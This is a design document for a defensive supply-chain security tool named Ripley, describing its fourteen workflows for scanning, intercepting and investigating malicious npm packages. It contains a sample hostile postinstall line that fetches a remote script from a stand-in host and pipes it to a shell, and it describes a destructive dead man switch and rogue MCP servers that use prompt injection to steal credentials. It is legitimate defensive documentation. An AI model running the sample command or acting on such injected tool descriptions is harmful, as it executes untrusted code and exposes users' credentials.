# Workflows

How developers interact with Ripley. Each workflow is a distinct path
through the system, triggered by different events and serving different
goals. For system internals, see [ARCHITECTURE.md](ARCHITECTURE.md).
For the CLI reference, see [README.md](README.md). For view wireframes,
see [UI.md](UI.md). For the design system, see [DESIGN.md](DESIGN.md).
For the complete settings reference, see [SETTINGS.md](SETTINGS.md).


## Overview

| # | Workflow | Trigger | Phase | Key commands |
|---|----------|---------|-------|--------------|
| 1 | [Setup & onboarding](#1-setup--onboarding) | First install | — | `guard install`, `config` |
| 2 | [Proactive scan](#2-proactive-scan) | Developer initiative | Before | `scan`, `scan --format json` |
| 3 | [Continuous monitoring](#3-continuous-monitoring) | Tray app running | Before | `ripley`, `status` |
| 4 | [Install interception](#4-install-interception) | `npm install` | Before | guard shim, `script-shell` |
| 5 | [Alert-driven fix](#5-alert-driven-fix) | Notification fires | Before → After | notification → Fix → harness |
| 6 | [Post-breach forensics](#6-post-breach-forensics) | Breach discovered | After | `scan --deep` |
| 7 | [Active containment](#7-active-containment) | Live compromise detected | During | `monitor`, `contain` |
| 8 | [CI pipeline gate](#8-ci-pipeline-gate) | CI build | Before | `scan`, `.ripley.toml` |
| 9 | [Trust management](#9-trust-management) | False positives / known-good packages | — | `guard trust`, `guard untrust` |
| 10 | [Environment security audit](#10-environment-security-audit) | Developer initiative / periodic | Before | `audit`, `audit --fix` |
| 11 | [PM hardening](#11-pm-hardening) | Developer initiative / CI | Before | `harden`, `harden --format json` |
| 12 | [Standalone fix](#12-standalone-fix) | Developer knows the CVE | After | `fix <cve>` |
| 13 | [Credential exposure assessment](#13-credential-exposure-assessment) | Post-breach investigation | After | `exposure <cve>` |
| 14 | [Uninstall & upgrade](#14-uninstall--upgrade) | Maintenance | — | `guard uninstall` |


---


## 1. Setup & onboarding

**Who:** A developer installing Ripley for the first time.

**Goal:** Get from zero to protected with minimal friction. All features are
opt-in — a fresh install does nothing until explicitly enabled.

```
install ripley                          ← binary from release or cargo install
ripley guard install                    ← set up PATH shims + script-shell
ripley config                           ← review/edit config.toml
ripley scan .                           ← first scan to establish baseline
```

**What happens:**

1. `guard install` creates shim binaries in `{data_dir}/bin/`, prepends to
   PATH via shell RC, and sets `script-shell` in `.npmrc`.
2. A default `config.toml` is written to `{config_dir}/` if none exists.
3. The first `scan` populates the advisory cache from OSV.dev.

**Offline first run:** If the network is unavailable during the first `scan`,
Ripley exits with code 2 and a clear error: "no cached advisories and network
unavailable --- run with network access to populate the cache." Guard shim
installation and config setup work offline --- only advisory fetching requires
network access. Subsequent offline runs use the cached data with a staleness
warning.

**Exit state:** Package manager installs are now intercepted. Advisory
database is cached locally. The developer can launch the tray app or
continue CLI-only.

```
Developer
    │
    ├── cargo install ripley
    │
    ├── ripley guard install
    │       ├── creates {data_dir}/bin/npm  (shim)
    │       ├── creates {data_dir}/bin/ripley-script-shell
    │       ├── appends PATH to ~/.zshrc
    │       └── sets script-shell in ~/.npmrc
    │
    ├── ripley config
    │       └── opens {config_dir}/config.toml
    │
    └── ripley scan .
            ├── fetches advisories from OSV.dev
            ├── caches to {data_dir}/advisories.redb
            ├── parses lockfiles in .
            ├── runs matcher
            └── prints results (exit 0=clean, 1=findings)
```


---


## 2. Proactive scan

**Who:** A developer who wants to check their project(s) on demand.

**Goal:** Find known-vulnerable dependencies before they cause harm.
This is the simplest workflow — no daemon, no interception, just a
one-shot audit.

```
ripley scan [path]                      ← table output (default)
ripley scan --format json [path]        ← machine-readable output
ripley scan --deep [path]               ← full forensic audit (see workflow 6)
```

**What happens:**

1. Walk the target path for lockfiles (`package-lock.json`, etc.).
2. Parse each lockfile into `(ecosystem, package, version)` tuples.
3. **Posture checks** — during parsing, flag risky dependency specifiers
   (`latest`, `*`, `git+`, `http://`, `file:`), missing integrity hashes,
   unexpected registry URLs, and HTTP downgrade from HTTPS.
4. Load advisories from local cache. If stale (> 1 hour), refresh from
   OSV.dev first (with ETag caching).
5. Run matcher: for each advisory, check if any installed version falls
   within an affected range.
6. Output results: advisory matches first, then posture warnings.

**Exit codes:** `0` = clean, `1` = findings, `2` = error. Posture
warnings are informational and do not cause exit code 1 unless
`[posture] strict = true` is set in `.ripley.toml` (see workflow 8).

```
ripley scan ~/src/myapp
    │
    ├── discover lockfiles
    │       └── ~/src/myapp/package-lock.json
    │
    ├── parse → [{express, 4.17.1, npm}, {lodash, 4.17.20, npm}, ...]
    │
    ├── posture checks
    │       ├── 3 packages use range specifiers (^)
    │       ├── 1 resolves from git+ source
    │       └── 47 entries missing integrity hashes
    │
    ├── load advisories (cache or fetch)
    │
    ├── match
    │       └── lodash@4.17.20 matches GHSA-xxxx (fixed in 4.17.21)
    │
    └── output
            ├── table: advisory matches + posture summary
            └── json:  {"matches": [...], "posture_warnings": [...]}
```


---


## 3. Continuous monitoring

**Who:** A developer running the tray app in the background.

**Goal:** Learn about newly disclosed vulnerabilities that affect your
installed packages — automatically, without running `scan` manually.

```
ripley                                  ← launch tray app (Ripley.app on macOS,
                                          Ripley.exe on Windows, AppImage /
                                          .deb / .rpm on Linux — Phase 6 M28)
ripley watch                            ← headless daemon mode (no tray icon, for servers)
ripley status                           ← check monitoring state via IPC
```

**What happens (continuous loop):**

1. On launch, index all lockfiles under configured project roots.
2. Poll OSV.dev on the configured interval (default: 5 minutes).
3. On each poll, run the matcher against the current lockfile index.
4. Watch for lockfile changes (filesystem events via `notify`). Re-index
   on change, re-run matcher.
5. When a new match is found, fire a native OS notification.
6. Click the tray icon to open the dashboard window --- shows all alerts,
   guard activity, and settings (see [UI.md](UI.md)).

**The loop:**

```
┌─────────────────────────────────────────────┐
│               Tray App (daemon)             │
│                                             │
│   ┌──────────┐        ┌──────────────┐      │
│   │  Poller  │───5m──►│   Matcher    │      │
│   │ (OSV.dev)│        │              │      │
│   └──────────┘        │ advisories × │      │
│                       │ lockfiles =  │      │
│   ┌──────────┐        │ alerts?      │      │
│   │ Watcher  │──fs───►│              │      │
│   │(lockfiles│ event  └──────┬───────┘      │
│   └──────────┘               │ yes          │
│                              ▼              │
│                      ┌──────────────┐       │
│                      │ Notification │       │
│                      │ [View] [Fix] │       │
│                      │ [Dismiss]    │       │
│                      └──────────────┘       │
└─────────────────────────────────────────────┘
```

**Exit state:** The developer is notified within minutes of any advisory
that matches a package they have installed — even if they didn't run
`npm audit` or read a security blog.


---


## 4. Install interception

**Who:** A developer running `npm install` (or any supported package manager)
with the guard active.

**Goal:** Catch malicious packages at install time — before lifecycle scripts
execute — without changing the developer's normal workflow.

```
npm install some-package                ← intercepted by PATH shim
```

**What happens (two layers):**

**Layer 1 — PATH shim** (pre-install advisory check):
1. Developer runs `npm install`.
2. The shim binary at `{data_dir}/bin/npm` runs instead of the real npm.
3. Shim checks the package against the local advisory DB.
4. If a known advisory matches: warn, then delegate to real npm.
5. If clean: delegate silently.

**Layer 2 — script-shell** (per-script analysis at execution time):
1. npm runs each lifecycle script through `ripley-script-shell` instead
   of `/bin/sh`.
2. The analyzer runs static analysis against the detection rule engine.
3. Low risk → auto-allow, execute via `/bin/sh`.
4. Medium/high risk → if the tray app is running, show a native dialog
   via IPC (see [UI.md](UI.md) "Guard Interception Dialog");
   otherwise fall back to a terminal prompt. Either way, show matched
   lines and prompt for allow/block.

**Why this matters (SLSA provenance bypass):** The TanStack compromise
(May 2026) proved that packages with valid SLSA provenance can be
malicious — the attacker hijacked the legitimate build pipeline. Any tool
relying solely on provenance or signing would have approved the packages.
Ripley's script-shell analyzes the actual script content regardless of
provenance status, making it the last line of defense when upstream trust
mechanisms fail.

```
npm install some-package
    │
    ├── PATH shim intercepts
    │       ├── advisory check against local DB
    │       │       └── warn if known advisory
    │       └── delegate to real npm
    │
    └── npm runs lifecycle scripts
            │
            ├── postinstall: "node setup.js"
            │       └── ripley-script-shell -c "node setup.js"
            │               ├── static analysis → Low risk
            │               └── auto-allow → /bin/sh -c "node setup.js"
            │
            └── postinstall: "curl evil.com/x.sh | sh"
                    └── ripley-script-shell -c "curl evil.com/x.sh | sh"
                            ├── static analysis → Critical
                            │       └── matched: network call + pipe to shell
                            ├── show highlighted analysis to developer
                            └── prompt: [allow] [block] [inspect] [always trust]
```

**Decision is logged** to `{data_dir}/guard.jsonl` (JSONL, inspectable with `jq`).


---


## 5. Alert-driven fix

**Who:** A developer who received a notification (from workflow 3 or 4)
and wants to fix it now.

**Goal:** Go from "you're affected" to "here's the fix, review the diff"
in one click — no manual research, no reading blog posts.

```
notification → [Fix] → prompt generated → AI harness launched → review diff
```

**What happens:**

1. Developer clicks "Fix" on a notification or in the dashboard's alert
   detail panel.
2. Prompt generator builds a self-contained remediation prompt from the
   match data: CVE, package, compromised version, clean version, IOC file
   paths to check, test instructions.
3. Harness launcher detects available AI CLI (`claude`, `codex`, `opencode`)
   and spawns it in a new terminal with the prompt.
4. The harness executes the fix. Developer reviews the diff and commits.

**Generated prompt example:**

```
In the project at /Users/jack/src/myapp, the package @tanstack/react-router
is installed at version 1.169.5, which is compromised (CVE-2026-45321).

1. Update to the latest clean version.
2. Check for these IOC files and remove them if present:
   - .claude/execution.js
   - .claude/setup.mjs
   - .vscode/setup.mjs
   - node_modules/@tanstack/*/router_init.js
3. Run the test suite and verify the build passes.
4. Report what you found and what you changed.
```

```
[Fix] clicked
    │
    ├── prompt generator
    │       ├── CVE-2026-45321
    │       ├── @tanstack/react-router@1.169.5
    │       ├── project: /Users/jack/src/myapp
    │       ├── clean version: 1.170.0
    │       ├── IOC files to check
    │       └── "run tests after fix"
    │
    ├── detect harness: claude (in PATH)
    │
    ├── spawn: claude -p "<prompt>"
    │
    └── developer reviews diff → commits
```


---


## 6. Post-breach forensics

**Who:** A developer who knows (or suspects) they were compromised — either
from a Ripley alert, a security blog, Twitter, or a colleague.

**Goal:** Answer three questions: What was affected? What do I need to
clean up? Which credentials do I need to rotate?

```
ripley scan --deep [path]               ← full forensic audit
```

**What happens:**

1. **Lockfile scan** — same as workflow 2: match installed packages against
   advisories.
2. **IOC scan** — search for known indicator-of-compromise files:
   `.claude/execution.js`, `.vscode/tasks.json` with unexpected `runOn`
   entries, `.mcp.json` and `.cursor/mcp.json` with rogue MCP server
   definitions or prompt injection in tool descriptions, suspicious files
   in `node_modules/.cache/`, unexpected `~/.ssh/authorized_keys` entries.
   Loads IOC profiles from `{config_dir}/iocs/` for incident-specific
   indicators (known-bad versions, payload filenames, C2 domains).
3. **Persistence audit** — check macOS persistence mechanisms:
   `~/Library/LaunchAgents/`, `crontab`, shell RC files for injected
   `curl`/`eval`/suspicious domains. Detect **dead man switch** patterns:
   malware that monitors credential validity and triggers destructive
   actions (e.g., `rm -rf ~`) if tokens are revoked.
4. **Credential exposure mapping** — based on the specific attack's known
   behavior, identify which credential stores were likely accessed (AWS
   keys, GitHub tokens, npm tokens, SSH keys, `.env` files, K8s configs).
   Generate a specific rotation checklist. When dead man switches are
   detected: **warn the developer to back up their home directory before
   rotating credentials**, and recommend disabling network access first.
5. **Report** — structured output: summary, findings by category,
   recommended actions. If the tray app is running, the report is also
   displayed in the dashboard's deep scan report view (see
   [UI.md](UI.md)).
6. **Remediation prompt** — if findings exist, generate a prompt and
   optionally launch a harness.

```
ripley scan --deep ~/src/myapp
    │
    ├── lockfile scan
    │       └── @tanstack/react-router@1.169.5 → GHSA-xxxx
    │
    ├── IOC scan
    │       ├── FOUND: .claude/execution.js
    │       ├── FOUND: .claude/setup.mjs
    │       ├── clean: .vscode/tasks.json
    │       └── FOUND: .mcp.json (rogue MCP server definition)
    │
    ├── persistence audit
    │       ├── clean: LaunchAgents
    │       ├── clean: crontab
    │       ├── FOUND: ~/.zshrc contains eval of unknown remote script
    │       ├── FOUND: .mcp.json contains rogue MCP server definition
    │       └── ⚠ DEAD MAN SWITCH: credential monitor detected
    │
    ├── credential exposure
    │       ├── AT RISK: ~/.npmrc (npm token)
    │       ├── AT RISK: ~/.aws/credentials
    │       ├── rotation commands for each
    │       └── ⚠ Back up ~ before rotating (dead man switch active)
    │
    └── report
            ├── 3 IOC findings (2 critical, 1 clean)
            ├── 1 persistence finding (+ dead man switch warning)
            ├── 2 credentials at risk
            └── remediation prompt generated
```


---


## 7. Active containment

**Who:** A developer whose machine shows signs of live compromise — Ripley's
runtime monitor detected suspicious activity.

**Goal:** Stop the attack in progress, preserve evidence, then investigate.

```
ripley monitor                          ← start watching (or tray app does this)
                                        ← notification: "Suspicious activity detected"
                                        ← [View] [Contain] [Investigate]
ripley contain <pid|pkg>                ← kill + snapshot
```

**What the monitor watches for:**

- Outbound connections from Node/Python/Ruby/Go processes to unknown IPs
- Writes to persistence paths: `.claude/settings.json`, `.vscode/tasks.json`,
  `.mcp.json`, `.cursor/mcp.json`, shell RC files, `~/Library/LaunchAgents/`
- New or modified MCP server definitions (rogue MCP servers can weaponize AI
  assistants as credential exfiltration agents via prompt injection in tool
  descriptions)
- Processes masquerading as system services
- Connections to known C2 infrastructure
- New files in `.claude/` or `.vscode/` not tracked by git
- Lockfile edits outside of an explicit install command

**Containment action:**

1. Kill the suspicious process.
2. Snapshot state: open files, network connections, environment variables,
   process tree.
3. Revoke network access if possible.
4. Fire high-priority notification with forensic summary.
5. Developer runs `scan --deep` (workflow 6) for full investigation.

```
ripley monitor (background)
    │
    ├── detect: node process → outbound to 185.x.x.x (unknown)
    │           writing to ~/.claude/settings.json
    │
    ├── notification: ⚠️ Suspicious activity
    │       [View] [Contain] [Investigate]
    │
    └── [Contain] clicked
            ├── kill PID 12345
            ├── snapshot: open fds, netstat, env, /proc
            ├── log to guard.jsonl
            └── prompt: run `ripley scan --deep` to investigate
```


---


## 8. CI pipeline gate

**Who:** A team running Ripley in a CI/CD pipeline.

**Goal:** Block builds that introduce known-vulnerable or suspicious
dependencies. No interactive prompts — automated pass/fail.

**Configuration** via `.ripley.toml` in the project root:

```toml
[guard]
mode = "strict"                         # "strict" blocks high-risk, "audit" logs only
trust = ["@tanstack/*", "typescript", "esbuild"]

[posture]
strict = true                           # posture warnings fail the build (exit 1)
require_lockfile = true                 # fail if no lockfile found
require_exact_versions = true           # flag range specifiers (^, ~, *, latest)
require_integrity_hashes = true         # flag entries missing integrity hashes
block_exotic_sources = true             # flag git+, http://, file: sources
```

**Pipeline step:**

```yaml
# GitHub Actions example
- name: Supply chain check
  run: |
    ripley scan --format json .
    # exit 0 = clean, exit 1 = findings (fail the build)
```

**What happens:**

1. `CI=true` detected — guard runs non-interactively (no prompts).
2. Lockfile scan runs against advisory DB.
3. Posture checks run during parsing (same checks as workflow 2).
4. Exit code 0 = clean, exit code 1 = findings, exit code 2 = error.
   Use exit code to gate the build (findings fail the pipeline).
5. With `[posture] strict = true`, posture warnings **also cause exit 1**.
   This lets teams enforce dependency pinning, lockfile presence, and
   integrity hashes as build requirements.
6. The `mode` setting in `.ripley.toml` controls **guard interception**
   (script analysis during install), not scan behavior. `strict` blocks
   high-risk scripts; `audit` logs only.
7. JSON output can be piped to SARIF converters or dashboards.

```
CI pipeline
    │
    ├── ripley scan --format json .
    │       ├── parse lockfiles
    │       ├── posture checks (if [posture] in .ripley.toml)
    │       ├── check advisories
    │       ├── match
    │       └── output JSON to stdout
    │           {"matches": [...], "posture_warnings": [...]}
    │
    ├── exit code
    │       ├── 0 → clean, build continues
    │       ├── 1 → findings (or posture violations if strict), build fails
    │       └── 2 → error, build fails
    │
    └── JSON output → security dashboard / SARIF
```


---


## 9. Trust management

**Who:** A developer dealing with false positives, known-good packages that
trigger analysis, or packages they've reviewed and explicitly approved.

**Goal:** Reduce noise without disabling protection. Trust is explicit,
local, and human-editable.

```
ripley guard trust express              ← add to trust list
ripley guard trust @tanstack/*          ← trust an entire scope
ripley guard untrust express            ← remove from trust list
ripley guard log                        ← review recent decisions
ripley guard status                     ← show current guard state
```

**How trust works:**

- Trusted packages bypass the static analyzer (script-shell) during install.
- Trust is stored in `config.toml` under `[guard] trust = [...]`.
- The file is human-editable, version-controllable, and local to the machine.
- Ripley never auto-trusts. The developer must explicitly opt in.
- Enterprise mode can enforce a locked trust list from an org admin.

```
ripley guard trust @myorg/*
    │
    ├── read {config_dir}/config.toml
    ├── add "@myorg/*" to [guard].trust
    ├── write atomically (temp file → rename)
    └── confirm: "@myorg/* added to trust list"

npm install @myorg/internal-tool
    │
    ├── PATH shim: advisory check (still runs)
    └── script-shell: @myorg/internal-tool is trusted → skip analysis
```


---


## 10. Environment security audit

**Who:** A developer who wants to check whether their machine is hardened
against supply chain attacks — or who already uses Claude Code to ad-hoc
audit their device and wants a reproducible, comprehensive alternative.

**Goal:** Audit the developer's environment beyond packages: machine
security, toolchain config, AI tool integrity, and credential exposure.
Use AI to interpret findings contextually and generate fix commands.

```
ripley audit                        ← comprehensive environment audit
ripley audit --fix                  ← audit + AI-powered remediation
ripley audit --format json          ← machine-readable output
```

**What happens:**

1. **Machine security checks** — is disk encryption enabled (FileVault)?
   Firewall active? OS updates current? Screen lock configured?
2. **Developer toolchain checks** — git signing configured? SSH keys
   using strong algorithms and passphrase-protected? Shell RC files clean?
3. **AI tool config integrity** — `.mcp.json`, `.cursor/mcp.json` free of
   rogue MCP servers? `.claude/settings.json` hooks authorized? No
   `enableAllProjectMcpServers` set?
4. **Credential exposure** — secrets in shell history? `.env` committed to
   git? npm tokens broadly scoped? Plaintext tokens in RC files?
5. **Report** — traffic-light summary per category (green/yellow/red),
   with specific findings and fix commands.
6. **AI remediation** (with `--fix`) — all findings structured into a
   prompt, handed to the configured AI harness. The AI generates
   environment-specific commands (tailored to OS version, shell, PM)
   and prioritizes by actual risk considering the combination of findings.

**Why AI powers the analysis:** The programmatic checks ensure nothing is
missed — they're deterministic and reproducible. But raw findings alone
don't tell a developer what to prioritize. The AI sees the combination:
"FileVault is disabled AND you have unencrypted npm tokens on this
machine — this is critical because a stolen laptop exposes those tokens."
This is the same pattern developers use when asking Claude Code to
"audit my MacBook's security" — Ripley productizes it with guaranteed-
complete data rather than best-effort LLM exploration.

```
ripley audit
    │
    ├── machine security
    │       ├── ● FileVault: disabled                    [RED]
    │       ├── ● Firewall: active                       [GREEN]
    │       ├── ● OS updates: 2 pending                  [YELLOW]
    │       └── ● Screen lock: 5 min                     [GREEN]
    │
    ├── developer toolchain
    │       ├── ● Git signing: not configured             [YELLOW]
    │       ├── ● SSH keys: Ed25519, passphrase set       [GREEN]
    │       └── ● Shell RC: clean                         [GREEN]
    │
    ├── AI tool config
    │       ├── ● .mcp.json: not present                 [GREEN]
    │       ├── ● .claude/settings.json: no hooks        [GREEN]
    │       └── ● .cursor/mcp.json: 1 rogue server       [RED]
    │
    ├── credential exposure
    │       ├── ● npm tokens: broadly scoped (no expiry)  [RED]
    │       ├── ● .env in git: none found                [GREEN]
    │       └── ● shell history: 2 tokens found           [YELLOW]
    │
    └── summary
            ├── Machine:     ██░░ needs attention (1 red, 1 yellow)
            ├── Toolchain:   ███░ good (1 yellow)
            ├── AI tools:    ██░░ needs attention (1 red)
            └── Credentials: ██░░ needs attention (1 red, 1 yellow)

ripley audit --fix
    │
    ├── (same checks as above)
    │
    ├── prompt generator
    │       ├── all findings structured by category
    │       ├── environment context (macOS 15.4, zsh, npm 11)
    │       └── "generate fix commands for each finding"
    │
    ├── detect harness: claude (in PATH)
    │
    └── spawn: claude -p "<audit prompt>"
            └── AI generates environment-specific commands:
                    ├── sudo fdesetup enable
                    ├── npm config set //registry.npmjs.org/:_authToken=... --scope=@myorg
                    ├── remove rogue server from .cursor/mcp.json
                    └── history -c && export HISTFILE=/dev/null (temporary)
```


---


## 11. PM hardening

**Who:** A developer who wants to lock down their package manager configuration,
or a team enforcing baseline security in CI.

**Goal:** Detect the active package manager and recommend PM-specific hardening
settings. Normalizes fragmented setting names across npm, pnpm, Yarn, and Bun
into a single unified output.

```
ripley harden                       ← detect PM, recommend settings
ripley harden --format json         ← machine-readable output
```

**What happens:**

1. **Detect package manager** --- look for lockfiles and config files
   (`package-lock.json` → npm, `pnpm-lock.yaml` → pnpm, `yarn.lock` → Yarn,
   `bun.lockb` → Bun). If multiple, report for each.
2. **Dependency pinning** --- check `save-exact` (npm) / `savePrefix: ""`
   (pnpm), lockfile committed to git, integrity hashes present, no exotic
   sources (git+, http, file:).
3. **PM hardening** --- check release-age gating (`minimumReleaseAge`,
   `minReleaseAge`, `npmMinimalAgeGate`), script execution policy
   (`ignore-scripts`, `strictDepBuilds`, `allowBuilds`), exotic subdep
   blocking, trust policy (`trustPolicy: no-downgrade`).
4. **Provenance** --- check if own packages use Trusted Publishing (OIDC),
   detect provenance drops across dependency updates.
5. **Credential hygiene** --- npm tokens in `.npmrc` scoped vs broad, expiry
   set, tokens accidentally committed to project directories.
6. **Report** --- traffic-light summary per category with specific commands
   to run for each recommendation.

```
ripley harden
    │
    ├── detect PM: npm 11.2, pnpm 10.4
    │
    ├── dependency pinning
    │       ├── ● save-exact: not set                    [YELLOW]
    │       ├── ● lockfile: committed                    [GREEN]
    │       ├── ● integrity hashes: 412/459 present      [YELLOW]
    │       └── ● exotic sources: none                   [GREEN]
    │
    ├── PM hardening
    │       ├── ● ignore-scripts: not set                [YELLOW]
    │       │     → npm config set ignore-scripts true
    │       ├── ● minimumReleaseAge: not set             [RED]
    │       │     → npm config set minReleaseAge 86400
    │       └── ● pnpm trustPolicy: no-downgrade         [GREEN]
    │
    ├── provenance
    │       ├── ● trusted publishing: not configured     [YELLOW]
    │       └── ● provenance drops: none detected        [GREEN]
    │
    └── credential hygiene
            ├── ● .npmrc tokens: broadly scoped           [RED]
            │     → npm config set //registry.npmjs.org/:_authToken=... --scope=@myorg
            └── ● project .npmrc: clean                  [GREEN]
```


---


## 12. Standalone fix

**Who:** A developer who knows the CVE they need to fix --- from a security
blog, a colleague, or a previous `ripley scan` --- and wants to generate a
remediation prompt without re-scanning.

**Goal:** Go directly from CVE identifier to AI-powered remediation without
the scan-then-fix flow of workflow 5.

```
ripley fix <cve> [path]             ← fix a specific CVE in a project
ripley fix CVE-2026-45321           ← fix all affected projects
ripley fix CVE-2026-45321 ~/src/app ← fix a specific project
```

**What happens:**

1. Look up the CVE in the local advisory cache (fetch from OSV.dev if not
   cached).
2. If `[path]` is provided, scan that project. If omitted, scan all
   configured project roots.
3. Match the CVE against installed packages to find affected projects.
4. For each affected project:
   a. Generate a remediation prompt (package, version, clean version, IOC
      files, test instructions).
   b. Launch the configured AI harness with the prompt.
5. If the advisory has associated IOC profiles, include IOC file checks in
   the prompt.
6. Print the generated prompt to stdout if no harness is available.

```
ripley fix CVE-2026-45321
    │
    ├── lookup CVE-2026-45321 in advisory cache
    │       └── @tanstack/react-router, affected: 1.169.4-1.169.5
    │
    ├── scan configured project roots
    │       ├── ~/src/myapp: @tanstack/react-router@1.169.5 → AFFECTED
    │       └── ~/src/api: not affected
    │
    ├── generate prompt
    │       ├── project: ~/src/myapp
    │       ├── package: @tanstack/react-router@1.169.5
    │       ├── clean version: 1.170.0
    │       ├── IOC files: .claude/execution.js, .claude/setup.mjs, ...
    │       └── "run tests after fix"
    │
    ├── detect harness: claude (in PATH)
    │
    └── spawn: claude -p "<prompt>"
```


---


## 13. Credential exposure assessment

**Who:** A developer who has confirmed (or suspects) they were hit by a
specific attack and needs to know which credentials to rotate.

**Goal:** Map a specific attack's known behavior to the credential stores
on this machine. Generate a targeted rotation checklist --- not "rotate
everything" but "rotate these specific credentials because this specific
attack targets them."

```
ripley exposure <cve>               ← assess credential risk for an attack
ripley exposure CVE-2026-45321      ← which creds did TanStack target?
ripley exposure --format json <cve> ← machine-readable output
```

**What happens:**

1. Look up the CVE or attack identifier in the advisory cache and IOC
   profiles.
2. From the IOC profile, extract the list of targeted credential stores
   (e.g., `~/.npmrc`, `~/.aws/credentials`, `~/.ssh/id_*`).
3. Check which of those files exist on this machine and are non-empty.
4. For each at-risk credential, generate a rotation command.
5. If the attack has a known dead man switch (e.g., Mini Shai-Hulud),
   warn the developer to back up before rotating.
6. Output: table of at-risk credentials with rotation commands and
   priority (based on whether the file was actually accessed during the
   attack window).

```
ripley exposure CVE-2026-45321
    │
    ├── lookup CVE-2026-45321 → TanStack compromise (tanstack-2026-05)
    │
    ├── targeted credential stores (from IOC profile):
    │       ├── ~/.npmrc
    │       ├── ~/.aws/credentials
    │       ├── ~/.ssh/id_*
    │       ├── ~/.gitconfig
    │       └── ~/.env
    │
    ├── check local machine:
    │       ├── ● AT RISK  ~/.npmrc (exists, contains token)
    │       │     → npm token revoke && npm login
    │       ├── ● AT RISK  ~/.aws/credentials (exists)
    │       │     → aws iam delete-access-key && aws iam create-access-key
    │       ├── ● AT RISK  ~/.ssh/id_ed25519 (exists)
    │       │     → ssh-keygen -t ed25519 -C "new" && update authorized_keys
    │       ├── ● CLEAN    ~/.gitconfig (no tokens)
    │       └── ● CLEAN    ~/.env (not found)
    │
    ├── ⚠ dead man switch: YES (tanstack-2026-05 profile)
    │       "Back up home directory before rotating credentials.
    │        Disable network access first."
    │
    └── summary: 3 credentials at risk, 2 clean
```


---


## 14. Uninstall & upgrade

**Who:** A developer removing Ripley or upgrading to a new version.

**Goal:** Clean removal of all Ripley components, or seamless upgrade that
preserves configuration and advisory cache.

### Uninstall

```
ripley guard uninstall              ← remove guard shims and script-shell
```

**What `guard uninstall` removes:**

1. PATH shim binaries from `{data_dir}/bin/`.
2. The PATH prepend line from shell RC files (`.zshrc`, `.bashrc`).
3. The `script-shell` entry from `~/.npmrc`.
4. Autostart entry if installed: LaunchAgent plist on macOS, Registry `Run`
   key on Windows, XDG autostart `.desktop` file on Linux (stops tray app
   auto-start).

**What `guard uninstall` does NOT remove** (manual cleanup):

- `{config_dir}/config.toml` --- preserved so reinstall picks up preferences.
- `{data_dir}/advisories.redb` --- advisory cache, not sensitive.
- `{data_dir}/guard.jsonl` --- guard log, may be needed for compliance.
- `{config_dir}/rules/` and `{config_dir}/iocs/` --- user-supplied rules.
- The `ripley` binary itself (remove via package manager or `cargo uninstall`).
- The desktop app bundle: drag `Ripley.app` to Trash (macOS), uninstall via
  Settings → Apps (Windows `.msi`), or remove the AppImage / `apt remove
  ripley-desktop` / `dnf remove ripley-desktop` (Linux).

**Full removal:**

```
ripley guard uninstall              ← remove shims and hooks
# macOS
rm -rf ~/Library/Application\ Support/ripley/   ← data + config
rm -rf ~/Library/Caches/ripley/                 ← cache
# Linux
rm -rf ~/.config/ripley/ ~/.local/share/ripley/ ~/.cache/ripley/
# Windows (PowerShell)
Remove-Item -Recurse $env:APPDATA\ripley\ , $env:LOCALAPPDATA\ripley\
# Binary
cargo uninstall ripley              ← remove the binary
# or: rm /usr/local/bin/ripley (Unix) / del %USERPROFILE%\.cargo\bin\ripley.exe (Windows)
# Desktop app: per-OS uninstall path above
```

### Upgrade

Ripley stores configuration in human-editable TOML and advisory data in redb.
Upgrades preserve both:

- **Binary upgrade:** `cargo install --path crates/ripley-guard --force` (or
  replace the binary from a release artifact). The new binary reads the
  existing `config.toml` and `advisories.redb` without migration.
- **Guard shim upgrade:** `ripley guard install` is idempotent. Run it after
  upgrading the binary to update the shim binaries in `{data_dir}/bin/`.
- **Tray app upgrade:** Phase 6 M28 ships a Tauri updater (Ed25519-signed
  manifests) that handles upgrades in-app. Manual upgrade also supported:
  replace `Ripley.app` in `/Applications/` (macOS), run the new `.msi`
  installer (Windows), or replace the AppImage / `apt upgrade ripley-desktop`
  (Linux). All paths preserve the existing config and data directories.
- **Config schema changes:** New settings get their default values via
  `#[serde(default)]`. Removed settings are silently ignored. No migration
  step required.
- **redb schema changes:** If a future version changes the advisory table
  schema, the database is rebuilt on first fetch. Advisory data is ephemeral
  --- the source of truth is OSV.dev, not the local cache.


---


## Workflow map

How the workflows connect across the three phases:

```
                    SETUP
                      │
                      ▼
              ┌───────────────┐
              │  1. Onboard   │
              │ guard install │
              │ first scan    │
              └───────┬───────┘
                      │
          ┌───────────┼───────────┐
          ▼           ▼           ▼
   ┌─────────┐  ┌──────────┐  ┌──────────┐
   │ BEFORE  │  │  DURING  │  │  AFTER   │
   └────┬────┘  └────┬─────┘  └────┬─────┘
        │             │             │
   ┌────┴────┐   ┌────┴─────┐  ┌───┴──────┐
   │2. Scan  │   │7. Active │  │6. Deep   │
   │  (CLI)  │   │  monitor │  │  scan    │
   └────┬────┘   └────┬─────┘  └───┬──────┘
        │             │             │
   ┌────┴────┐   ┌────┴─────┐  ┌───┴──────┐
   │3. Tray  │   │ Contain  │  │13. Cred  │
   │ monitor │   │ process  │  │ exposure │
   └────┬────┘   └──────────┘  └───┬──────┘
        │                          │
   ┌────┴────┐                 ┌───┴──────┐
   │4. Guard │                 │12. Fix   │
   │intercept│                 │ (CLI)    │
   └────┬────┘                 └───┬──────┘
        │                          │
   ┌────┴────┐                 ┌───┴──────┐
   │9. Trust │                 │5. Fix    │
   │ manage  │                 │ (notif.) │
   └─────────┘                 └──────────┘

   ┌──────────┐  ┌──────────┐
   │10. Audit │  │11. Harden│  (standalone — can run any time)
   │ environ. │  │ PM config│
   └──────────┘  └──────────┘

   ┌─────────┐   ┌──────────┐
   │8. CI    │   │14. Uninst│  (maintenance / lifecycle)
   │ gate    │   │ & upgrade│
   └─────────┘   └──────────┘
```
